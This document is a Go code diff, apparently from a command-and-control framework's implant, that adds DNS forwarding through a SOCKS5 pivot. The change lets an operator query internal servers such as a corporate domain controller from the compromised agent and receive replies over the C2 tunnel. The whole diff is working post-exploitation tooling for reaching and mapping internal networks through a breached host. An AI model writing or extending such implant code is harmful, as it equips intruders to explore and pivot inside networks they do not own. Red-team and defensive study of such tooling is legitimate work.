@@ -5,16 +5,20 @@ package handler
 // The CC-internal SOCKS5 pivot relays TCP byte streams; UDP (DNS) traffic
 // cannot be carried that way. Instead the C2's UDP-ASSOCIATE handler (see
 // cc/server/socks5_udp.go) forwards each DNS query to the bound agent with
-// !dns_query (raw packet, base64 in --query) and this handler answers with a
-// complete DNS response packet (raw bytes on the message tunnel).
+// !dns_query (raw packet, base64 in --query, plus --server when the client
+// addressed a specific DNS server) and this handler answers with a complete
+// DNS response packet (raw bytes on the message tunnel).
 //
 // The agent is the right place to do the actual resolution: it is the only
-// party that can reach agent-side / internal DNS servers, it honours the
-// configured DoH/transport proxies, and — being a stub resolver — it simply
-// asks the OS (or the DoH server) the same way it resolves any name it needs.
-// Only A/AAAA questions are answered (that is all libc / the TUN stack's DNS
-// hijack path needs); other record types get an empty NOERROR answer section,
-// exactly like a stub resolver that forwards only A/AAAA.
+// party that can reach agent-side / internal DNS servers. When the operator's
+// client asked a specific DNS server (--server, e.g. a corporate DC), the raw
+// query is forwarded to that server over UDP and its reply is returned
+// unchanged, so internal records (CNAME/SRV/…, TTLs, rcode) are preserved.
+// When no server is given or forwarding fails, the agent resolves the name
+// locally (OS resolver / DoH) and builds an A/AAAA answer — the fallback a
+// plain stub resolver needs. Non-A/AAAA questions without a --server get an
+// empty NOERROR answer, exactly like a stub resolver that forwards only
+// A/AAAA.
 //
 // All input is hostile (it originates from operator-side traffic): every
 // length and index derived from the query packet is bounds-checked before
@@ -57,6 +61,7 @@ var dnsInFlight atomic.Int32
 func dnsQueryCmdRun(cmd *cobra.Command, _ []string) {
 	token, _ := cmd.Flags().GetString("token")
 	queryB64, _ := cmd.Flags().GetString("query")
+	dnsServer, _ := cmd.Flags().GetString("server")
 	if token == "" || queryB64 == "" {
 		c2transport.NotifyC2(cmd, "Error: !dns_query requires --token and --query")
 		return
@@ -71,8 +76,9 @@ func dnsQueryCmdRun(cmd *cobra.Command, _ []string) {
 		return
 	}
 
-	// Parse the question so we can resolve the name and echo the same
-	// ID/question in the reply (required by every DNS client for matching).
+	// Parse the question so the fallback resolver knows what to look up and
+	// can echo the same ID/question in its reply. (When --server forwarding
+	// succeeds the upstream reply already echoes them.)
 	qid, qname, qtype, qstart, qend, ok := parseDNSQuestion(raw)
 	if !ok {
 		c2transport.NotifyC2(cmd, "Error: malformed DNS query (%d bytes)", len(raw))
@@ -87,15 +93,63 @@ func dnsQueryCmdRun(cmd *cobra.Command, _ []string) {
 	}
 	defer dnsInFlight.Store(0)
 
+	// Preferred path: the operator's client addressed a specific DNS server
+	// (e.g. a corporate DC). Forward the raw query there so internal records
+	// are answered authoritatively. Fall back to local resolution on any
+	// forwarding failure.
+	if dnsServer != "" {
+		if reply, ferr := forwardDNSQuery(raw, dnsServer); ferr == nil {
+			c2transport.NotifyC2Binary(cmd, reply)
+			logging.Debugf("dns_query %s (%s) forwarded to %s -> %d bytes", qname, dnsTypeName(qtype), dnsServer, len(reply))
+			return
+		}
+		logging.Debugf("dns_query %s: forward to %s failed, falling back to local resolution", qname, dnsServer)
+	}
+
 	answers, err := resolveDNSName(qname, qtype)
 	if err != nil {
 		logging.Debugf("dns_query %s (%s): %v", qname, dnsTypeName(qtype), err)
-		c2transport.NotifyC2Binary(cmd, buildDNSReply(raw, qid, qstart, qend, qtype, answers, dnsRcodeForErr(err)))
+		c2transport.NotifyC2Binary(cmd, buildDNSReply(raw, qid, qstart, qend, qtype, nil, dnsRcodeForErr(err)))
 		return
 	}
 	resp := buildDNSReply(raw, qid, qstart, qend, qtype, answers, dnsRcodeNoError)
 	c2transport.NotifyC2Binary(cmd, resp)
 	logging.Debugf("dns_query %s (%s) -> %d answer(s)", qname, dnsTypeName(qtype), len(answers))
+}
+
+// forwardDNSQuery sends the raw DNS query to server (host or host:port, port
+// defaulting to 53) over UDP and returns the raw reply. The upstream answer is
+// returned byte-for-byte so the operator's client sees exactly what the
+// authoritative/recursive server it chose had to say.
+func forwardDNSQuery(query []byte, server string) ([]byte, error) {
+	if server == "" {
+		return nil, fmt.Errorf("empty DNS server")
+	}
+	if _, _, err := net.SplitHostPort(server); err != nil {
+		server = net.JoinHostPort(server, "53")
+	}
+	conn, err := net.DialTimeout("udp", server, dnsQueryTimeout)
+	if err != nil {
+		return nil, fmt.Errorf("dial %s: %w", server, err)
+	}
+	defer conn.Close()
+	_ = conn.SetDeadline(time.Now().Add(dnsQueryTimeout))
+	if _, err := conn.Write(query); err != nil {
+		return nil, fmt.Errorf("write: %w", err)
+	}
+	buf := make([]byte, 64*1024)
+	n, err := conn.Read(buf)
+	if err != nil {
+		return nil, fmt.Errorf("read: %w", err)
+	}
+	if n <= dnsHeaderSize {
+		return nil, fmt.Errorf("short reply (%d bytes)", n)
+	}
+	// The reply must echo the query ID, else it is a stray/late datagram.
+	if binary.BigEndian.Uint16(buf[0:2]) != binary.BigEndian.Uint16(query[0:2]) {
+		return nil, fmt.Errorf("reply ID mismatch")
+	}
+	return append([]byte(nil), buf[:n]...), nil
 }
 
 // parseDNSQuestion extracts the ID, lowercased QNAME, QTYPE and the byte span
